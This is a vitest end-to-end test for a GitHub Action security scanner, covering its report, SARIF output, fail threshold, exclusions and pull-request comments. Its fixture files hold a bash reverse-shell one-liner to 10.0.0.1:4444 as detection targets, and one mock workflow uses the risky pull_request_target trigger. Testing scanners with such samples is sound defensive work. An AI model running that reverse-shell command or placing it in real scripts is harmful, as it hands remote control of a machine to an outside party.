// End-to-end run of the action against a temporary repository. Only the built-in
// checks run (no network); GitHub is mocked.
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { createRepo, stubInputs } from '@tests';

const github = vi.hoisted(() => ({
  context: { payload: {}, repo: { owner: 'o', repo: 'r' } },
  getOctokit: vi.fn(),
}));
vi.mock('@actions/github', () => github);

const { run } = await import('@apps');

// @actions/core caches the summary path after the first write, so it must not change
// between tests: one file for the whole suite, truncated before each test.
const meta = mkdtempSync(path.join(os.tmpdir(), 'psg-meta-'));
const summary = path.join(meta, 'summary');
const outputs = path.join(meta, 'output');
let workspace = '';

afterAll(() => {
  rmSync(meta, { recursive: true, force: true });
});

beforeEach(() => {
  writeFileSync(summary, '');
  writeFileSync(outputs, '');
  workspace = createRepo({
    'evil.sh': 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    'ignored.sh': '# security-guard: ignore\nbash -i >& /dev/tcp/10.0.0.1/4444',
    'excluded/x.sh': 'bash -i >& /dev/tcp/10.0.0.1/4444',
    'vendor/v.sh': 'bash -i >& /dev/tcp/10.0.0.1/4444',
    '.github/workflows/ci.yml': 'on: push\n',
  });
  vi.stubEnv('GITHUB_WORKSPACE', workspace);
  vi.stubEnv('GITHUB_STEP_SUMMARY', summary);
  vi.stubEnv('GITHUB_OUTPUT', outputs);
  stubInputs(vi.stubEnv, {
    'github-token': '',
    'checks': 'malware,workflows',
    'fail-on': 'high',
    'scope': 'auto',
    'comment': 'true',
    'comment-when-clean': 'false',
    'exclude': 'excluded/**',
    'osv-scanner-version': '2.7.0',
    'gitleaks-version': '8.30.1',
    'semgrep-version': '1.186.0',
  });
  vi.spyOn(process.stdout, 'write').mockImplementation(() => true);
  github.context.payload = {};
});

afterEach(() => {
  process.exitCode = undefined;
});

describe('run', () => {
  it('scans, reports and fails at the threshold', async () => {
    await run();

    const report = readFileSync(summary, 'utf8');
    expect(report).toMatch(/Shell \(2\)/); // excluded/ and vendor/ are not counted
    expect(report).toMatch(/`evil\.sh:1`/);
    expect(report).not.toMatch(/ignored\.sh|excluded\/x\.sh|vendor\//);
    expect(report).toMatch(
      /Workflows \| built-in \| ⏭️ skipped — only runs on pull requests/,
    );

    const sarif = JSON.parse(
      readFileSync(path.join(workspace, 'polyglot-security-guard.sarif'), 'utf8'),
    ) as {
      runs: { results: unknown[] }[];
    };
    expect(sarif.runs[0]?.results).toHaveLength(1);
    expect(readFileSync(outputs, 'utf8')).toMatch(/findings-count[\s\S]*\n1\n/);
    expect(process.exitCode).toBe(1);
  });

  it('passes when nothing reaches fail-on', async () => {
    stubInputs(vi.stubEnv, { 'fail-on': 'none' });
    await run();
    expect(process.exitCode).toBeUndefined();
  });

  it('only scans changed files on pull requests and comments with the results', async () => {
    const createComment = vi.fn();
    const files = [
      { filename: 'evil.sh', status: 'modified' },
      { filename: 'vendor/v.sh', status: 'added' },
      { filename: '.github/workflows/ci.yml', status: 'added' },
    ];
    const client = {
      rest: {
        pulls: { listFiles: vi.fn() },
        issues: { listComments: vi.fn(), createComment, updateComment: vi.fn() },
        repos: {
          getContent: vi.fn(() =>
            Promise.resolve({ data: 'on: pull_request_target\njobs: {}\n' }),
          ),
        },
      },
      paginate: vi.fn((fn: unknown) =>
        Promise.resolve(fn === client.rest.pulls.listFiles ? files : []),
      ),
    };
    github.getOctokit.mockReturnValue(client);
    github.context.payload = {
      pull_request: {
        number: 9,
        base: { sha: 'b' },
        head: { sha: 'h', repo: { name: 'r', owner: { login: 'o' } } },
      },
    };
    stubInputs(vi.stubEnv, { 'github-token': 'token' });

    await run();

    const report = readFileSync(summary, 'utf8');
    expect(report).toMatch(/files changed in this PR/);
    expect(report).toMatch(/dangerous-trigger|pull_request_target/);
    expect(createComment).toHaveBeenCalledOnce();
    expect(createComment.mock.calls[0]?.[0]).toMatchObject({ issue_number: 9 });
  });

  it('skips file checks when a PR changes nothing in scope', async () => {
    const client = {
      rest: { pulls: { listFiles: vi.fn() }, issues: {}, repos: {} },
      paginate: vi.fn(() =>
        Promise.resolve([{ filename: 'README.md', status: 'modified' }]),
      ),
    };
    github.getOctokit.mockReturnValue(client);
    github.context.payload = {
      pull_request: { number: 1, base: { sha: 'b' }, head: { sha: 'h' } },
    };
    stubInputs(vi.stubEnv, { 'github-token': 'token', 'checks': 'malware' });

    await run();
    expect(readFileSync(summary, 'utf8')).toMatch(/skipped — no in-scope files changed/);
  });

  it('refuses an empty workspace with a hint about checkout', async () => {
    vi.stubEnv('GITHUB_WORKSPACE', createRepo({}));
    await expect(run()).rejects.toThrow(/actions\/checkout/);
  });
});
